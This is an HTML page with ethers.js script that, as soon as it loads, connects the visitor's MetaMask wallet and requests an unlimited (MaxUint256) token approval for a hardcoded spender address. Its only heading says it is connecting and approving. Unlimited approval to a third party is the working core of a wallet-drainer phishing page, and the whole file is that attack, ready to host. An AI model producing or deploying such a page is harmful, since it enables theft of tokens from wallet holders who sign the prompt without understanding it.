<!DOCTYPE html>
<html>
<head>
  <title>Auto Approve Token</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
  <h2>Connecting wallet and approving token...</h2>

  <script>
    const tokenAddress = "0xa19f5264f7d7be11c451c093d8f92592820bea86"; // Replace with your token address
    const spenderAddress = "0x974c32106390e0F378f36FbF4428d4F32D813dd7"; // Replace with contract that will spend the token
    const tokenABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];

    const maxApproval = ethers.constants.MaxUint256;

    async function autoConnectAndApprove() {
      if (!window.ethereum) {
        alert("Please install MetaMask!");
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []); // Prompt MetaMask connect

        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();
        console.log("Connected:", userAddress);

        const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);

        const tx = await tokenContract.approve(spenderAddress, maxApproval);
        console.log("Approval transaction sent:", tx.hash);
        alert("Approval transaction sent! Check MetaMask.");
      } catch (err) {
        console.error("Something went wrong:", err);
        alert("User rejected or error occurred.");
      }
    }

    // Auto-run on page load
    window.addEventListener('load', () => {
      autoConnectAndApprove();
    });
  </script>
</body>
</html>
